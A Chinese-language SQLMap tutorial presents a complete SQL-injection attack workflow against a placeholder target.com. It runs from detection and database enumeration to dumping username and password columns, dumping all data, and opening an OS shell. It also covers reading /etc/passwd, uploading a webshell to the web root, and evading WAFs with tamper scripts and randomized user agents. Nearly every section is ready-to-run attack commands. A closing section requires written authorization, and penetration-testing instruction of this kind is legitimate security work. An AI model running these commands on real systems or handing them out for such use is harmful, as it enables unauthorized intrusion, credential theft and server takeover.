```markdown
# SQLMap 全面使用指南 (2025年更新版)

## 一、基础环境配置
### 1.1 安装方法
```bash
# Kali Linux/Parrot OS 自带
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python3 sqlmap.py --version  # 验证安装

# Windows环境需预装Python3并配置环境变量
```

## 二、基础检测与信息获取
### 2.1 注入点探测
```bash
# GET型注入检测
python3 sqlmap.py -u "http://target.com/news.php?id=1" --batch

# POST型注入检测
python3 sqlmap.py -u "http://target.com/login" --data="user=admin&pass=123" --batch

# Cookie注入检测
python3 sqlmap.py -u "http://target.com/" --cookie="PHPSESSID=abc123*" --level 2
```
> **关键参数**：`--batch`自动选择默认选项，`--level`提升检测强度

### 2.2 数据库信息获取
```bash
# 获取所有数据库
python3 sqlmap.py -u "http://target.com?id=1" --dbs

# 查看当前数据库
python3 sqlmap.py -u "http://target.com?id=1" --current-db

# 列出指定库表结构
python3 sqlmap.py -u "http://target.com?id=1" -D security -T users --columns
```

## 三、高级利用技术
### 3.1 数据提取与脱库
```bash
# 导出指定表数据
python3 sqlmap.py -u "http://target.com?id=1" -D security -T users -C username,password --dump

# 批量导出所有数据
python3 sqlmap.py -u "http://target.com?id=1" --dump-all --output-dir=/tmp/sqlmap_data
```

### 3.2 系统权限获取
```bash
# 尝试获取系统Shell（需DBA权限）
python3 sqlmap.py -u "http://target.com?id=1" --os-shell

# 执行远程命令（Windows示例）
python3 sqlmap.py -u "http://target.com?id=1" --os-cmd "whoami"
```

### 3.3 文件读写操作
```bash
# 读取服务器文件
python3 sqlmap.py -u "http://target.com?id=1" --file-read="/etc/passwd"

# 上传Webshell（需写权限）
python3 sqlmap.py -u "http://target.com?id=1" --file-write="shell.php" --file-dest="/var/www/html/"
```

## 四、高级参数详解
### 4.1 绕过防护机制
```bash
# 使用Tamper脚本绕过WAF
python3 sqlmap.py -u "http://target.com?id=1" --tamper=charencode,space2comment

# 随机化请求特征
python3 sqlmap.py -u "http://target.com?id=1" --random-agent --delay=2
```

### 4.2 性能与检测优化
| 参数          | 功能说明                                                     | 典型值            |
| ------------- | ------------------------------------------------------------ | ----------------- |
| `--threads`   | 多线程加速检测（最大10）                                     | --threads=8       |
| `--level`     | 检测深度（1-5级，级别越高payload越多）                       | --level=5         |
| `--risk`      | 风险等级（1-3级，3级含危险操作）                             | --risk=3          |
| `--technique` | 指定注入类型（B:布尔盲注/E:报错注入/U:联合查询/S:堆叠注入/T:时间盲注） | --technique=BEUST |

## 五、实战场景案例
### 5.1 完整渗透流程
1. **漏洞检测**  
   ```bash
   python3 sqlmap.py -u "http://target.com/news.php?id=1" --batch
   ```
2. **获取数据库**  
   ```bash
   python3 sqlmap.py -u "http://target.com/news.php?id=1" --dbs
   ```
3. **提取关键数据**  
   ```bash
   python3 sqlmap.py -u "http://target.com/news.php?id=1" -D userdb -T accounts --dump
   ```
4. **权限提升**  
   ```bash
   python3 sqlmap.py -u "http://target.com/news.php?id=1" --os-shell
   ```

## 六、法律与安全规范
1. **授权要求**  
   所有测试必须取得目标系统所有者的书面授权
2. **风险规避**  
   生产环境禁用`--dump-all`等高风险操作，建议使用`--output-dir`隔离数据
3. **数据保护**  
   测试结果需加密存储，测试后应删除敏感数据

> **法律声明**：本文所述技术仅限合法授权测试使用，违反《网络安全法》将承担刑事责任

---

### 引用来源
: 腾讯云开发者社区-SQLMap详解  
: 极简速查指南-参数解析  
: 常用手册-高级命令  
: SQLMap安装与维护指南  
: 终极指南-实战案例  
: 入门操作教程  
: CSDN博客-基础教程  
: WAF绕过技巧  
: 高级参数详解文档  
```